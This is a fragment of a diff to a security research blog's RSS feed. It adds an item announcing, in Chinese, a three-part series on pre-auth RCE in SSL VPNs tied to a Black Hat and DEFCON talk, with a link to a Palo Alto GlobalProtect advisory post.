+&lt;p&gt;這將會是我們 SSL VPN 研究的系列文，預計會有三篇。這也是我們研究團隊今年在 &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; 和 &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; 的演講『 &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; 』中的一小部分，敬請期待！&lt;/p&gt;
+</description>
+                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
+                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
+                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
+        </item>
 
         <item>
                 <title>Operation Crack: Hacking IDA Pro Installer PRNG from an Unusual Way</title>
